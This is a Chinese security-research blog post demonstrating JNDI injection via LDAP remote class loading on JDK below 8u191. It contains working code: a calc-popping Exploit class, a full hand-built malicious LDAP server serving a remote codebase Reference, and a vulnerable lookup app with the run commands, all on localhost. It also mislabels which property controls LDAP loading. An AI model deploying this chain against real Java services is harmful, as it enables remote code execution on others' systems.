+++
title = "JNDI攻击（jdk 8u191 以下）"
date = 2026-06-15T18:40:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 正文

## 原理

远程类加载  （reference 远程工厂类注入）

JNDI 允许通过reference 对象将命令系统中的名称映射到外部资源   如果本地找不到对应资源  jvm就会去reference中指定的远程恶意服务器  下载并实例化类  

两个  jvm  默认参数   

com.sun.jndi.rmi.object.trustURLCodebase   -> 控制  rmi 远程类加载


com.sun.jndi.cosnaming.object.trustURLCodebase  -> 控制  ldap远程类加载


## jdk 8u121以下


最完美的攻击阶段


rmi  和 ldap  当中 trustURLCodebase 默认都是 true

既可以  rmi://  协议   也可以  ldap:// 协议


## jdk 8u121-jdk8u191 之间

限制了  rmi  

但是  ldap  仍然是 true


## 以ldap 为例 (通杀8u191以下所有版本)


### 恶意类  

Exploit.java

然后编译  

javac Exploit.java  得到 Exploit.class

```java
public class Exploit {
    static {
        try {
            // 弹出计算器
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### 启动HTTP服务器

在恶意类的目录下开启  

python本地起一个服务

python -m http.server 8000


### 启动LDAP服务器


LdapRefServer.java

```java
package com.jndi;

  

import javax.naming.Reference;

import javax.naming.StringRefAddr;

import javax.naming.ldap.LdapContext;

import java.io.*;

import java.net.ServerSocket;

import java.net.Socket;

import java.util.Hashtable;

  

/**

 * 恶意 LDAP 服务器

 *

 * 使用纯 Socket 实现，不依赖第三方 LDAP SDK

 * 拦截 JNDI lookup 的搜索请求，返回包含 javaCodebase/javaFactory 的恶意 Reference 条目

 *

 * 攻击流程：

 *   受害者 lookup("ldap://127.0.0.1:1389/Exploit")

 *   → LDAP 服务器返回 Reference

 *   → 受害者去 http://127.0.0.1:8000/Exploit.class 下载恶意类

 *   → 执行 Exploit 静态代码块 → 弹出计算器

 */

public class LdapRefServer {

  

    private static final int LDAP_PORT = 1389;

    private static final String HTTP_SERVER = "http://127.0.0.1:8000/";

  

    public static void main(String[] args) throws Exception {

        System.out.println("========== 启动恶意 LDAP 服务器 ==========");

        System.out.println("监听端口: " + LDAP_PORT);

        System.out.println("远程 Codebase: " + HTTP_SERVER);

        System.out.println("等待受害者发送 JNDI lookup 请求...\n");

  

        ServerSocket serverSocket = new ServerSocket(LDAP_PORT);

  

        while (true) {

            Socket socket = serverSocket.accept();

            new Thread(() -> handleConnection(socket)).start();

        }

    }

  

    private static void handleConnection(Socket socket) {

        try {

            socket.setSoTimeout(5000); // 5秒超时

            InputStream in = socket.getInputStream();

            OutputStream out = socket.getOutputStream();

  

            // 循环处理 LDAP 请求

            while (true) {

                byte[] request;

                try {

                    request = readLdapMessage(in);

                } catch (Exception e) {

                    // 客户端关闭连接或超时

                    break;

                }

  

                int messageId = parseMessageId(request);

                int operationType = parseOperationType(request);

  

                if (operationType == 0x60) {

                    // BindRequest [APPLICATION 0]

                    System.out.println("[LDAP] 收到 Bind 请求, messageID=" + messageId);

                    byte[] bindResponse = buildBindResponse(messageId);

                    out.write(bindResponse);

                    out.flush();

                    System.out.println("[LDAP] 已返回 Bind 成功响应");

                } else if (operationType == 0x63) {

                    // SearchRequest [APPLICATION 3]

                    System.out.println("[LDAP] 收到 Search 请求, messageID=" + messageId);

  

                    byte[] searchEntryResponse = buildSearchEntryResponse(messageId);

                    byte[] searchDoneResponse = buildSearchDoneResponse(messageId);

  

                    out.write(searchEntryResponse);

                    out.flush();

                    System.out.println("[LDAP] 已返回恶意 Reference 条目:");

                    System.out.println("       javaCodebase = " + HTTP_SERVER);

                    System.out.println("       javaFactory  = Exploit\n");

  

                    out.write(searchDoneResponse);

                    out.flush();

                } else {

                    System.out.println("[LDAP] 收到未知请求, operationType=0x" + Integer.toHexString(operationType));

                }

            }

  

            socket.close();

        } catch (Exception e) {

            // ignore

        }

    }

  

    /**

     * 读取一个完整的 LDAP 消息

     * LDAP 报文格式: Tag + Length + Value (BER 编码)

     */

    private static byte[] readLdapMessage(InputStream in) throws IOException {

        // 读取 Tag (1 byte)

        int tag = in.read();

        // 读取 Length

        int length = readBerLength(in);

        // 读取 Value

        byte[] value = new byte[length];

        int totalRead = 0;

        while (totalRead < length) {

            int read = in.read(value, totalRead, length - totalRead);

            if (read == -1) break;

            totalRead += read;

        }

        // 返回完整报文（包含 tag + length + value）

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        baos.write(tag);

        BerEncoder.writeBerLength(baos, length);

        baos.write(value);

        return baos.toByteArray();

    }

  

    /**

     * 读取 BER 编码的长度

     */

    private static int readBerLength(InputStream in) throws IOException {

        int firstByte = in.read();

        if ((firstByte & 0x80) == 0) {

            return firstByte; // 短格式

        }

        int numBytes = firstByte & 0x7F;

        int length = 0;

        for (int i = 0; i < numBytes; i++) {

            length = (length << 8) | (in.read() & 0xFF);

        }

        return length;

    }

  

    /**

     * 从 LDAP 请求中解析 messageID

     */

    private static int parseMessageId(byte[] message) {

        // LDAPMessage ::= SEQUENCE { messageID INTEGER, ... }

        // SEQUENCE tag=0x30, 然后是长度, 然后是 INTEGER tag=0x02, 长度, 值

        int offset = 0;

        // 跳过 SEQUENCE tag

        if (message[offset] != 0x30) return 1;

        offset++;

        // 跳过 SEQUENCE length

        if ((message[offset] & 0x80) != 0) {

            offset += (message[offset] & 0x7F) + 1;

        } else {

            offset++;

        }

        // 读取 INTEGER

        if (message[offset] != 0x02) return 1;

        offset++;

        int intLen = message[offset] & 0xFF;

        offset++;

        int value = 0;

        for (int i = 0; i < intLen; i++) {

            value = (value << 8) | (message[offset++] & 0xFF);

        }

        return value;

    }

  

    /**

     * 从 LDAP 请求中解析操作类型

     * 返回 APPLICATION tag 字节（如 0x60=BindRequest, 0x63=SearchRequest）

     */

    private static int parseOperationType(byte[] message) {

        int offset = 0;

        // 跳过 SEQUENCE tag

        if (message[offset] != 0x30) return 0;

        offset++;

        // 跳过 SEQUENCE length

        if ((message[offset] & 0x80) != 0) {

            offset += (message[offset] & 0x7F) + 1;

        } else {

            offset++;

        }

        // 跳过 messageID (INTEGER)

        if (message[offset] != 0x02) return 0;

        offset++;

        int intLen = message[offset] & 0xFF;

        offset += 1 + intLen;

        // 返回操作类型 tag

        return message[offset] & 0xFF;

    }

  

    // ========== 构造 LDAP 响应 ==========

  

    /**

     * 构造 Bind 成功响应

     * BindResponse ::= [APPLICATION 1] SEQUENCE { resultCode ENUMERATED, ... }

     */

    private static byte[] buildBindResponse(int messageId) throws IOException {

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        // messageID

        BerEncoder.encodeInteger(baos, messageId);

        // BindResponse [APPLICATION 1] ::= SEQUENCE { resultCode, matchedDN, diagnosticMessage }

        ByteArrayOutputStream bindResp = new ByteArrayOutputStream();

        BerEncoder.encodeEnumerated(bindResp, 0); // resultCode = success

        BerEncoder.encodeOctetString(bindResp, ""); // matchedDN

        BerEncoder.encodeOctetString(bindResp, ""); // diagnosticMessage

        BerEncoder.encodeApplication(baos, 1, bindResp.toByteArray());

        // 包装成 LDAPMessage SEQUENCE

        return BerEncoder.encodeSequence(baos.toByteArray());

    }

  

    /**

     * 构造 SearchResultEntry 响应

     * SearchResultEntry ::= [APPLICATION 4] SEQUENCE { objectName, attributes }

     */

    private static byte[] buildSearchEntryResponse(int messageId) throws IOException {

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        // messageID

        BerEncoder.encodeInteger(baos, messageId);

  

        // 构造 SearchResultEntry 内容

        ByteArrayOutputStream entryContent = new ByteArrayOutputStream();

        // objectName

        BerEncoder.encodeOctetString(entryContent, "Exploit");

        // attributes (PartialAttributeList)

        ByteArrayOutputStream attrs = new ByteArrayOutputStream();

        BerEncoder.encodeAttribute(attrs, "objectClass", "javaNamingReference");

        BerEncoder.encodeAttribute(attrs, "javaClassName", "Exploit");

        BerEncoder.encodeAttribute(attrs, "javaCodebase", HTTP_SERVER);

        BerEncoder.encodeAttribute(attrs, "javaFactory", "Exploit");

        BerEncoder.encodeSequence(entryContent, attrs.toByteArray());

  

        // SearchResultEntry [APPLICATION 4]

        BerEncoder.encodeApplication(baos, 4, entryContent.toByteArray());

  

        // 包装成 LDAPMessage SEQUENCE

        return BerEncoder.encodeSequence(baos.toByteArray());

    }

  

    /**

     * 构造 SearchResultDone 响应

     * SearchResultDone ::= [APPLICATION 5] LDAPResult

     */

    private static byte[] buildSearchDoneResponse(int messageId) throws IOException {

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        // messageID

        BerEncoder.encodeInteger(baos, messageId);

        // LDAPResult ::= SEQUENCE { resultCode, matchedDN, diagnosticMessage }

        ByteArrayOutputStream result = new ByteArrayOutputStream();

        BerEncoder.encodeEnumerated(result, 0); // resultCode = success

        BerEncoder.encodeOctetString(result, ""); // matchedDN

        BerEncoder.encodeOctetString(result, ""); // diagnosticMessage

        BerEncoder.encodeApplication(baos, 5, result.toByteArray());

        // 包装成 LDAPMessage SEQUENCE

        return BerEncoder.encodeSequence(baos.toByteArray());

    }

  

    /**

     * BER 编码工具类

     */

    private static class BerEncoder {

  

        static void encodeInteger(ByteArrayOutputStream baos, int value) throws IOException {

            baos.write(0x02); // INTEGER tag

            if (value >= 0 && value <= 127) {

                baos.write(0x01);

                baos.write(value);

            } else if (value >= 128 && value <= 255) {

                baos.write(0x02);

                baos.write((value >> 8) & 0xFF);

                baos.write(value & 0xFF);

            } else {

                byte[] intBytes = intToBytes(value);

                baos.write(intBytes.length);

                baos.write(intBytes);

            }

        }

  

        static void encodeEnumerated(ByteArrayOutputStream baos, int value) throws IOException {

            baos.write(0x0A); // ENUMERATED tag

            baos.write(0x01);

            baos.write(value);

        }

  

        static void encodeOctetString(ByteArrayOutputStream baos, String value) throws IOException {

            baos.write(0x04); // OCTET STRING tag

            byte[] bytes = value.getBytes();

            writeBerLength(baos, bytes.length);

            baos.write(bytes);

        }

  

        static void encodeSequence(ByteArrayOutputStream baos, byte[] content) throws IOException {

            baos.write(0x30); // SEQUENCE tag

            writeBerLength(baos, content.length);

            baos.write(content);

        }

  

        static byte[] encodeSequence(byte[] content) throws IOException {

            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            baos.write(0x30);

            writeBerLength(baos, content.length);

            baos.write(content);

            return baos.toByteArray();

        }

  

        static void encodeApplication(ByteArrayOutputStream baos, int tag, byte[] content) throws IOException {

            baos.write(0x60 | tag); // APPLICATION | CONSTRUCTED tag

            writeBerLength(baos, content.length);

            baos.write(content);

        }

  

        static void encodeAttribute(ByteArrayOutputStream baos, String attrName, String attrValue) throws IOException {

            ByteArrayOutputStream attrContent = new ByteArrayOutputStream();

            // attribute type

            encodeOctetString(attrContent, attrName);

            // attribute values (SET)

            ByteArrayOutputStream valueSet = new ByteArrayOutputStream();

            encodeOctetString(valueSet, attrValue);

            attrContent.write(0x31); // SET tag

            writeBerLength(attrContent, valueSet.size());

            attrContent.write(valueSet.toByteArray());

            // 整个 attribute 是一个 SEQUENCE

            ByteArrayOutputStream attrSeq = new ByteArrayOutputStream();

            encodeSequence(attrSeq, attrContent.toByteArray());

            baos.write(attrSeq.toByteArray());

        }

  

        static void writeBerLength(ByteArrayOutputStream baos, int length) throws IOException {

            if (length <= 127) {

                baos.write(length);

            } else if (length <= 255) {

                baos.write(0x81);

                baos.write(length);

            } else {

                baos.write(0x82);

                baos.write((length >> 8) & 0xFF);

                baos.write(length & 0xFF);

            }

        }

  

        private static byte[] intToBytes(int value) {

            if (value == 0) return new byte[]{0};

            byte[] bytes = new byte[4];

            int offset = 4;

            boolean started = false;

            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            for (int i = 3; i >= 0; i--) {

                byte b = (byte) ((value >> (i * 8)) & 0xFF);

                if (b != 0 || started) {

                    baos.write(b);

                    started = true;

                }

            }

            return baos.toByteArray();

        }

    }

}
```



### 触发受害者JNDI注入


VulnerableApp.java

```java
package com.jndi;

  

import javax.naming.InitialContext;

  

/**

 * 受害者应用

 *

 * 模拟存在 JNDI 注入漏洞的应用程序

 * 当 jndiName 可被攻击者控制时，lookup() 会去请求恶意 LDAP 服务器

 * LDAP 服务器返回 Reference → 受害者去 HTTP 服务器下载 Exploit.class → 执行恶意代码

 */

public class VulnerableApp {

  

    public static void main(String[] args) throws Exception {

        System.out.println("========== 受害者应用启动 ==========");

        System.out.println("模拟存在 JNDI 注入漏洞的场景\n");

  

        // 假设这个 jndiName 来自用户输入，攻击者可以控制

        String jndiName = "ldap://127.0.0.1:1389/Exploit";

  

        System.out.println("[受害者] 执行 ctx.lookup(\"" + jndiName + "\")");

  

        InitialContext ctx = new InitialContext();

        ctx.lookup(jndiName);

  

        System.out.println("[受害者] lookup 返回");

    }

}
```




## 过程示例


启动   HTTP  服务器



![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260525223911246.png)


启动恶意 LDAP 服务器

mvn exec:java '-Dexec.mainClass=com.jndi.LdapRefServer'

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260525224550567.png)


运行受害者应用

java -cp "target/classes" "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true"

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260525224709775.png)

发现已经成功弹计算机了

查看ldap服务器进行查看相关情况

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260525224831909.png)
